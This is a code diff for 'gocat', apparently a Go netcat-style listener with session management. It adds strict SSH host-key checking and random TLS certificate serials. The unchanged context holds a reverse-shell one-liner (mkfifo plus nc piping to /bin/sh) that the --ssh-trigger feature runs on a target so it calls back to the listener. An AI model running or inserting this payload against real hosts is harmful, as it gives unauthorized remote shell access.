@@ -65,15 +65,16 @@ var (
 	listenCRLFMode   bool
 	listenZeroIOMode bool
 	// Session management flags
-	listenSessionMode bool
-	listenAutoUpgrade bool
-	listenNoAttach    bool
-	listenMaintain    int
-	listenPayloads    bool
-	listenIface       string
-	listenSingle      bool
-	listenSSHTrigger  string
-	listenMaxSessions int
+	listenSessionMode  bool
+	listenAutoUpgrade  bool
+	listenNoAttach     bool
+	listenMaintain     int
+	listenPayloads     bool
+	listenIface        string
+	listenSingle       bool
+	listenSSHTrigger   string
+	listenSSHStrictKey bool
+	listenMaxSessions  int
 )
 
 // foregroundMu guarantees a single stdin owner across concurrent
@@ -127,6 +128,7 @@ func init() {
 	listenCmd.Flags().BoolVar(&listenSingle, "single-session", false, "Stop listener after the first session (session mode only)")
 	listenCmd.Flags().IntVar(&listenMaxSessions, "max-sessions", 5, "Max active sessions per host (0 rejects new, -1 disables)")
 	listenCmd.Flags().StringVar(&listenSSHTrigger, "ssh-trigger", "", "SSH to user@host and trigger a callback shell (e.g. user@target)")
+	listenCmd.Flags().BoolVar(&listenSSHStrictKey, "ssh-strict-host-key", true, "Enforce SSH host key checking for --ssh-trigger")
 
 	// Mark conflicting flags
 	listenCmd.MarkFlagsMutuallyExclusive("interactive", "local")
@@ -431,7 +433,7 @@ func generateSelfSignedCert(address string) (tls.Certificate, error) {
 	}
 
 	template := x509.Certificate{
-		SerialNumber: big.NewInt(1),
+		SerialNumber: mustRandomSerial(),
 		Subject: pkix.Name{
 			CommonName:   "gocat",
 			Organization: []string{"gocat"},
@@ -460,6 +462,15 @@ func generateSelfSignedCert(address string) (tls.Certificate, error) {
 	return tls.X509KeyPair(certPEM, keyPEM)
 }
 
+// mustRandomSerial returns a random 128-bit certificate serial number.
+func mustRandomSerial() *big.Int {
+	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
+	if err != nil {
+		return big.NewInt(time.Now().UnixNano())
+	}
+	return serial
+}
+
 // triggerSSHCallback SSHes to target and runs a reverse-shell one-liner there
 // that calls back to this listener.
 func triggerSSHCallback(target, listenHost, listenPort string) {
@@ -474,10 +485,15 @@ func triggerSSHCallback(target, listenHost, listenPort string) {
 			`(rm -f /tmp/gcfifo; mkfifo /tmp/gcfifo && nc %s %s 0</tmp/gcfifo | /bin/sh >/tmp/gcfifo 2>&1 &)`,
 		callbackHost, listenPort, callbackHost, listenPort)
 
+	strictKey := "yes"
+	if !listenSSHStrictKey {
+		strictKey = "no"
+		logger.Warn("--ssh-trigger with host key checking disabled: MITM can steal the trigger")
+	}
 	cmd := exec.Command("ssh",
 		"-o", "BatchMode=yes",
 		"-o", "ConnectTimeout=10",
-		"-o", "StrictHostKeyChecking=no",
+		"-o", "StrictHostKeyChecking="+strictKey,
 		target, payload)
 
 	logger.Info("SSH trigger: %s -> callback %s:%s", target, callbackHost, listenPort)
